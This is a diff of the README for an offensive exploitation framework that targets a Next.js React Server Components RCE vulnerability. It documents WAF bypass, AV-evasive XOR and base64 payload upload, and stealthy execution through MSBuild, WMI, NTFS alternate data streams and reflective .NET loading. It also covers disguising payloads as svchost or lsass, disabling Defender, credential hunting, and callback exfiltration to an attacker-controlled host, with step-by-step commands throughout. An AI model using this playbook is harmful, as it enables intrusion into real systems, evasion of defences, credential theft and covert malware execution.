@@ -1,4 +1,4 @@
-# React2Shell Advanced v3
+# React2Shell Advanced v5
 
 Advanced exploitation framework for **CVE-2025-55182** — Remote Code Execution in Next.js React Server Components via insecure deserialization in the Flight protocol.
 
@@ -14,51 +14,48 @@ Advanced exploitation framework for **CVE-2025-55182** — Remote Code Execution
 
 ### WAF Bypass
 - 6 bypass presets (`none`, `light`, `medium`, `generic`, `heavy`, `aggressive`)
-- Unicode JSON escaping for keywords (`__proto__`, `constructor`)
-- Multipart structure manipulation (boundary obfuscation, charset tricks)
-- JS code obfuscation via `eval(Buffer.from(b64))`
+- Unicode JSON escaping, multipart manipulation, JS obfuscation
 - Custom Host header for reverse-proxy bypass (`-H domain`)
-- Auto domain resolution from IP via reverse DNS
+
+### Evasive Upload Pipeline (v5)
+- **XOR Encryption** — All file bytes XOR'd with random key (eliminates PE signatures)
+- **Base64 Encoding** — XOR'd bytes base64-encoded for text-safe transfer
+- **Chunked Upload** — 7.5KB chunks via PowerShell `Set-Content`/`Add-Content`
+- **Zero Signature** — `.tmp` file on disk is undetectable by any AV
+- **Metadata Storage** — XOR key + path stored for automatic execution
+
+### Evasive Execution Arsenal (v5) — 6 Methods
+
+| Command | Method | How It Works | Best For |
+|---------|--------|--------------|----------|
+| `.rundecode name` | **PS Decode + WMI** | PowerShell decodes in background, WMI launches (parent=WmiPrvSE.exe) | **Most reliable — use this first** |
+| `.run name` | **Smart Auto** | Tries all 5 methods below automatically | When you want to try everything |
+| `.runmsbuild name` | **MSBuild LOLBIN** | Writes .csproj with inline C#, MSBuild.exe compiles+executes | When MSBuild is available |
+| `.runwmi name` | **WMI + Node.js** | Node.js decodes, wmic launches (parent=WmiPrvSE.exe) | When Node.js is available |
+| `.runads name` | **ADS Stream** | Decodes into NTFS Alternate Data Stream, executes from ADS | When Defender skips ADS |
+| `.runmem name` | **Reflective .NET** | Decodes in memory, Assembly.Load() — zero disk write | When binary is .NET assembly |
+| `.runraw t k` | **Manual** | Specify .tmp path and XOR key manually | When upload metadata is lost |
+
+### Upload Format
+```
+Original Binary → XOR(key) → Base64 → .tmp file on target
+                                         (text, undetectable)
+
+Correct Decode:  ReadAllText → FromBase64String → XOR(key) → WriteAllBytes
+                 (text)         (binary bytes)     (decrypt)   (valid PE)
+```
 
 ### Post-Exploitation Enumeration
-- **`.info`** — Quick system enumeration (user, OS, IP, privileges, AV)
-- **`.fullinfo`** — Comprehensive enumeration (runs all modules below)
-- **`.users`** — User enumeration, group membership, privileges
-- **`.ps`** — Running processes
-- **`.net`** — Network interfaces, connections, ARP, routes, DNS
-- **`.services`** — Running and startup services
-- **`.shares`** — Network shares and mapped drives
-- **`.firewall`** — Firewall status and rules
-- **`.secrets`** — Credential hunting (env vars, SSH keys, SAM, `.env` files, registry)
-- **`.persist`** — Persistence check (scheduled tasks, SUID, cron, startup)
-- **`.software`** — Installed software, patches, runtime versions
-
-### File Operations
-- **`.upload`** — Chunked upload with 6KB chunks, PowerShell `Set-Content`/`Add-Content` (no `\r\n` corruption), retry logic (3 attempts/chunk), file size verification
-- **`.download`** — Download files from target (base64 via PowerShell/base64)
-- **`.cat`** — Cross-platform file reader with auto backslash→forward-slash conversion
-
-### Execution Tactics
-- **`.exec path [args]`** — Smart executable launcher:
-  - Resolves relative paths to full CWD-based paths
-  - Checks file existence before attempting execution
-  - Tries: `cmd /c` (full path), `cmd /c` (`.\` prefix), PowerShell, WMIC, background `start`
-  - Interprets WMIC return codes (0=Success, 2=Access Denied, 9=Path Not Found, etc.)
-  - Detects AV-blocked output
-  - Last resort: copy+rename with random name to evade signature detection
-- **`.bg cmd`** — Fire-and-forget background execution (no output wait)
-- **`.kill pid|name`** — Kill process by PID or image name
+- **`.info`** / **`.fullinfo`** — Quick / comprehensive system enumeration
+- **`.users`** / **`.ps`** / **`.net`** / **`.services`** / **`.shares`** / **`.firewall`**
+- **`.secrets`** — Credential hunting (env vars, SSH keys, SAM, `.env`)
+- **`.persist`** — Persistence check (scheduled tasks, SUID, cron)
+- **`.software`** — Installed software, patches, runtimes
 
 ### AV/Defender Management
-- **`.av`** — Full AV status: Defender RT protection, exclusions, running AV processes, **recent threat detections**
-- **`.avoff`** — Disable Defender real-time monitoring (tries `Set-MpPreference`, `sc config`, `sc stop`, registry)
-- **`.exclude path`** — Add Defender exclusion path
-
-### Shell
-- All commands auto-capture **stderr** (`2>&1`) — no more silent failures
-- Directory traversal with `cd` (Windows: forward-slash CWD, bare drive letters `cd C:`, `cd ..` at root)
-- Readline history, output saving, interactive prompt with status display
-- Multi-channel exfiltration: redirect, error, OOB callback, DNS
+- **`.av`** — Full AV status, exclusions, recent threat detections
+- **`.avoff`** — Disable Defender real-time monitoring (needs admin)
+- **`.exclude path`** — Add Defender exclusion path (needs admin)
 
 ## Installation
 
@@ -66,7 +63,7 @@ Advanced exploitation framework for **CVE-2025-55182** — Remote Code Execution
 pip install requests
 ```
 
-## Usage
+## Quick Start
 
 ```bash
 # Interactive shell
@@ -75,21 +72,88 @@ python3 react2shell_advanced.py -u https://target.com
 # Safe vulnerability check (no code execution)
 python3 react2shell_advanced.py -u https://target.com --safeprobe
 
-# Full auto-escalation (tries all bypass × strategy × exfil combos)
+# Full auto-escalation
 python3 react2shell_advanced.py -u https://target.com --auto-pwn
 
 # Single command
 python3 react2shell_advanced.py -u https://target.com -c "whoami"
 
-# Custom Host header (bypass WAF blocking IP-based requests)
+# Custom Host header (bypass WAF)
 python3 react2shell_advanced.py -u http://1.2.3.4:3000 -H target.com
-
-# WAF bypass + obfuscation
-python3 react2shell_advanced.py -u https://target.com -j 2 -o 3 --bypass medium
-
-# OOB callback exfiltration
-python3 react2shell_advanced.py -u https://target.com --exfil callback --callback-url http://YOUR_IP:PORT
 ```
+
+## Step-by-Step: Upload & Execute a Payload
+
+### Step 1: Upload
+```bash
+user@target$ .upload /path/to/payload.exe C:\Windows\Tasks
+```
+Output:
+```
+[*] Uploading payload.exe → C:/Windows/Tasks/payload.exe (1782272B, 317 chunks, XOR key=0xA5)
+  [100%] Chunk 317/317 (766s)
+[+] Upload complete: C:/Windows/Tasks/payload.exe.tmp (2376364B b64, XOR=0xA5)
+  Execute with: .run payload.exe
+```
+
+### Step 2: Execute (choose one)
+
+**Option A — `.rundecode` (recommended, most reliable):**
+```bash
+user@target$ .rundecode payload.exe
+```
+This does:
+1. Background PowerShell decode: `ReadAllText → Base64 → XOR → WriteAllBytes`
+2. Polls until decoded file appears with correct size
+3. Auto-launches via WMI (`wmic process call create`)
+4. Output filename auto-picked from: svchost, winlogon, services, lsass, csrss
+
+**Option B — `.run` (smart auto, tries all 5 methods):**
+```bash
+user@target$ .run payload.exe
+```
+Tries: MSBuild → WMI → ADS → Reflective .NET → Node.js
+
+**Option C — Specific method:**
+```bash
+user@target$ .runmsbuild payload.exe    # MSBuild LOLBIN
+user@target$ .runwmi payload.exe        # WMI + Node.js decode
+user@target$ .runads payload.exe        # NTFS ADS hidden stream
+user@target$ .runmem payload.exe        # Reflective .NET (memory only)
+```
+
+**Option D — Manual (if metadata lost):**
+```bash
+user@target$ .runraw C:/Windows/Tasks/payload.exe.tmp A5
+```
+
+### Step 3: Verify
+```bash
+user@target$ tasklist | findstr svchost
+```
+
+### Step 4: Clean Up
+```bash
+user@target$ del C:\Windows\Tasks\payload.exe.tmp
+user@target$ del C:\Windows\Tasks\svchost.exe
+```
+
+## Execution Methods Explained
+
+### `.rundecode` — PowerShell Decode + WMI Launch
+The most reliable method. Uses PowerShell's `[Convert]::FromBase64String()` to decode and XOR decrypt. Runs in background to avoid webshell timeout. WMI launch creates the process under `WmiPrvSE.exe` (trusted parent).
+
+### `.runmsbuild` — MSBuild LOLBIN (T1127.001)
+Writes a `.csproj` XML file containing inline C# code. MSBuild.exe (signed Microsoft binary) compiles and executes it. The C# code reads the .tmp, base64 decodes, XOR decrypts, writes the binary, and starts it. No PowerShell = no AMSI scanning.
+
+### `.runwmi` — WMI Process Chain (T1047)
+Node.js decodes the .tmp to a .scr file (bypasses AMSI since Node.js isn't hooked). Then `wmic process call create` launches it with WmiPrvSE.exe as parent — breaking the C2 process chain.
+
+### `.runads` — Alternate Data Stream (T1564.004)
+Decodes the binary into an NTFS ADS (e.g., `update.log:svc.exe`). The binary is hidden from `dir` and most AV scanners. Execution from ADS often bypasses Defender's file monitoring.
+
+### `.runmem` — Reflective .NET Assembly (T1620)
+Zero disk write. Reads .tmp, base64 decodes, XOR decrypts entirely in PowerShell memory. Uses `[Reflection.Assembly]::Load()` to load the .NET assembly and invokes `Main()`. Only works for .NET binaries (auto-detects and skips if not .NET).
 
 ## Shell Commands Reference
 
@@ -97,8 +161,7 @@ python3 react2shell_advanced.py -u https://target.com --exfil callback --callbac
 | Command | Description |
 |---------|-------------|
 | `.safeprobe` | Non-RCE vulnerability check |
-| `.auto [cmd]` | Auto-escalate through all 30 combos |
-| `.rawtest [cmd]` | Raw response debug |
+| `.auto [cmd]` | Auto-escalate through all combos |
 | `.strategy A\|B` | Switch payload variant |
 | `.exfil [ch]` | Switch exfil channel |
 | `.bypass [preset]` | WAF bypass preset |
@@ -111,77 +174,38 @@ python3 react2shell_advanced.py -u https://target.com --exfil callback --callbac
 |---------|-------------|
 | `.info` | Quick system enumeration |
 | `.fullinfo` | Full enumeration (all modules) |
-| `.users` | User accounts and privileges |
-| `.ps` | Running processes |
-| `.net` | Network info |
-| `.services` | Running services |
-| `.shares` | Network shares |
-| `.firewall` | Firewall rules |
-| `.secrets` | Credential hunting |
-| `.persist` | Persistence mechanisms |
-| `.software` | Installed software |
+| `.users` / `.ps` / `.net` | Users, processes, network |
+| `.services` / `.shares` | Services, network shares |
+| `.firewall` / `.secrets` | Firewall rules, credentials |
+| `.persist` / `.software` | Persistence, installed software |
 
 ### File Operations
 | Command | Description |
 |---------|-------------|
-| `.upload local remote` | Upload file (chunked, retries, size verification) |
-| `.download remote [local]` | Download file from target |
+| `.upload local remote` | Evasive upload (XOR + b64 + chunked) |
+| `.download remote` | Download file from target |
 | `.cat path` | Read file content |
-| `cd path` | Change directory (supports `cd C:`, `cd ..`) |
 
 ### Execution
 | Command | Description |
 |---------|-------------|
-| `.exec path [args]` | Smart exe launcher (tries 5+ methods) |
-| `.bg cmd` | Background execution (fire & forget) |
-| `.kill pid\|name` | Kill process by PID or name |
+| `.rundecode name [out.exe]` | **PS decode + WMI launch (recommended)** |
+| `.run name [args]` | Smart auto (tries all 5 methods) |
+| `.runmsbuild name` | MSBuild LOLBIN execution |
+| `.runwmi name` | WMI + Node.js execution |
+| `.runads name` | ADS stream execution |
+| `.runmem name` | Reflective .NET memory load |
+| `.runraw path key` | Manual XOR key execution |
+| `.exec path [args]` | Direct exe launcher (5+ methods) |
+| `.bg cmd` | Background execution |
+| `.kill pid\|name` | Kill process |
 
 ### AV/Defender
 | Command | Description |
 |---------|-------------|
-| `.av` | AV status, exclusions, recent threats |
-| `.avoff` | Disable Defender real-time protection |
-| `.exclude path` | Add Defender exclusion path |
-
-### Utility
-| Command | Description |
-|---------|-------------|
-| `.save` | Save last output to file |
-| `.status` | Show current config |
-| `.debug` | Toggle debug output |
-| `.root` | Toggle sudo mode (Linux) |
-| `.timeout N` | Set request timeout |
-| `.waf` | Fingerprint WAF |
-
-## Running Complex Commands
-
-Commands typed directly in the shell automatically capture stderr. For executables with arguments:
-
-```bash
-# Direct execution (auto-captures stderr)
-user@target$ lsasp.exe --payload rundll.enc --verbose
-
-# Smart launcher with full path resolution + multi-method fallback
-user@target$ .exec lsasp.exe --payload rundll.enc --encrypted --password "S3cret!" --type shellcode --exec-mode fork --verbose
-
-# Fire-and-forget for tools that run silently (shellcode loaders, implants)
-user@target$ .bg lsasp.exe --payload rundll.enc --encrypted --password "S3cret!" --type shellcode --exec-mode fork --blinding --stack-spoof --no-cleanup
-
-# If Defender blocks execution:
-user@target$ .av                          # Check AV status and what was blocked
-user@target$ .avoff                       # Try to disable RT protection
-user@target$ .exclude c:\Users\Public     # Or add exclusion for your drop directory
-user@target$ .upload tool.exe c:\Users\Public\tool.exe   # Re-upload
-user@target$ .exec tool.exe              # Try again
-```
-
-### Recommended Execution Flow
-1. **Upload**: `.upload /local/path/tool.exe c:\Users\Public\tool.exe`
-2. **Check AV**: `.av` — see if Defender is active
-3. **Exclude** (if needed): `.exclude c:\Users\Public`
-4. **Execute**: `.exec tool.exe --flags` — smart launcher tries all methods
-5. **Background** (if silent tool): `.bg tool.exe --flags`
-6. **Verify**: `tasklist | findstr tool` — check if process is running
+| `.av` | AV status, exclusions, threats |
+| `.avoff` | Disable Defender RT (admin) |
+| `.exclude path` | Add AV exclusion (admin) |
 
 ## CLI Options
 
